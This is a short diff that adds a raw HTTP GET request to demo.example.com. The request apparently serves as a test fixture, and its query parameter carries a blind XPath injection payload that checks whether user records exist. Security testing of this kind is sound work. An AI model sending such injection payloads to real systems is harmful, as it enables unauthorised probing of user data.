@@ -1,0 +1,4 @@
+GET /a?data='%20and%20count(//user)>0%20and%20' HTTP/1.1
+Host: demo.example.com
+Connection: close
+
